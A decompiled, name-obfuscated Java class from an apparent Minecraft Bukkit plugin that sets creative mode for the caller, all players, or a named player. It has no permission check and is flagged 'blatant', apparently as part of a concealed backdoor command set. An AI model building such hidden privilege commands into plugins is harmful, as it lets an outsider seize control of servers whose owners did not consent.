/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.GameMode
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class GmcCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public GmcCommand() {
        GmcCommand llllllllllllllIIIIllIIIIIIllIlll;
    }

    @Override
    public void execute(Core llllllllllllllIIIIllIIIIIIlIllIl, String llllllllllllllIIIIllIIIIIIlIllII, String[] llllllllllllllIIIIllIIIIIIlIlIII, Player llllllllllllllIIIIllIIIIIIlIlIlI) {
        if (llllllllllllllIIIIllIIIIIIlIlIII.length <= 1) {
            llllllllllllllIIIIllIIIIIIlIllIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIIIllIIIIIIlIllIl, () -> {
                llllllllllllllIIIIllIIIIIIlIlIlI.setGameMode(GameMode.CREATIVE);
                llllllllllllllIIIIllIIIIIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set your gamemode to ").append(Settings.RED).append("CREATIVE"))));
            });
        } else if (llllllllllllllIIIIllIIIIIIlIlIII[1].equals("*")) {
            for (Player llllllllllllllIIIIllIIIIIIllIIII : Bukkit.getOnlinePlayers()) {
                llllllllllllllIIIIllIIIIIIlIllIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIIIllIIIIIIlIllIl, () -> llllllllllllllIIIIllIIIIIIllIIII.setGameMode(GameMode.CREATIVE));
            }
            llllllllllllllIIIIllIIIIIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Everyone's gamemode is now set to").append(Settings.RED).append(" CREATIVE"))));
        } else {
            Player llllllllllllllIIIIllIIIIIIlIllll = Bukkit.getServer().getPlayer(llllllllllllllIIIIllIIIIIIlIlIII[1]);
            if (llllllllllllllIIIIllIIIIIIlIllll == null) {
                llllllllllllllIIIIllIIIIIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIllIIIIIIlIlIII[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                llllllllllllllIIIIllIIIIIIlIllIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIIIllIIIIIIlIllIl, () -> {
                    llllllllllllllIIIIllIIIIIIlIllll.setGameMode(GameMode.CREATIVE);
                    llllllllllllllIIIIllIIIIIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIllIIIIIIlIllll.getName()).append(Settings.WHITE).append("'s gamemode is now set to ").append(Settings.RED).append("CREATIVE"))));
                });
            }
        }
    }
}

